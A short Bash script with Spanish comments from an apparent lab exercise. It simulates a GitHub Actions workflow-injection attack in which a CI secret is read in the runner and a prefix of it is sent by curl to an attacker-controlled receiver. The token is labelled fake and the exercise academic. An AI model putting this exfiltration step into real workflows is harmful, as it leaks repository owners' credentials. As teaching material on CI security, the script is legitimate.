#!/bin/bash
# =====================================================================
#  SCRIPT QUE EJECUTA EL WORKFLOW VULNERABLE
#  Simula lo que hizo TeamPCP: leer el secreto del runner y mandarlo
#  a un servidor controlado (tu Kali).
#
#  IMPORTANTE / ETICA DE LABORATORIO:
#  - LAB_FAKE_TOKEN es un valor FALSO ("demo_token_no_real_123456").
#  - Solo enviamos un PREFIJO del token (los primeros 10 caracteres),
#    nunca un secreto real, nunca contra infraestructura ajena.
#  - Esto es una demostracion academica controlada.
# =====================================================================

echo "[INFO] Ejecutando validacion de PR (simulacion)"
echo "[INFO] Simulacion TeamPCP - Workflow Injection"
echo "[INFO] Repo: $GITHUB_REPOSITORY"

if [ -n "$LAB_FAKE_TOKEN" ]; then
  echo "[RIESGO] El secret quedo disponible dentro del runner (esto NO deberia pasar)"

  # Exfiltracion simulada: enviamos solo el prefijo del token falso al receptor
  curl -s -G "$EXFIL_URL" \
    --data-urlencode "event=workflow_injection" \
    --data-urlencode "repo=$GITHUB_REPOSITORY" \
    --data-urlencode "token_prefix=${LAB_FAKE_TOKEN:0:10}" \
    --data-urlencode "note=solo_token_falso_laboratorio"

  echo ""
  echo "[INFO] Token (prefijo) enviado al receptor de laboratorio"
else
  echo "[OK] No hay secret disponible en este contexto (asi deberia ser en el workflow seguro)"
fi
